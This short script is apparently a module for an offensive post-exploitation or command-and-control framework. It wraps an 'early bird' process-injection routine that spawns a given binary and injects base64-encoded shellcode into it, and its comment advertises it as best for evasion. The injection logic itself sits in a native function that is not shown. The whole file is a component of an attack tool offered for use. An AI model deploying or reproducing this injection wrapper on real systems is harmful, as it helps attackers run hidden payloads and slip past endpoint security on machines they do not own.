// Usage: extension load inject_spawn_early_bird <binary_path> <b64_shellcode>
// Best for: Evasion (Spawns new process)

if args.len() < 2 { return "Usage: <binary_path> <payload>"; }
return native_inject_spawn_early_bird(args[0], args[1]);
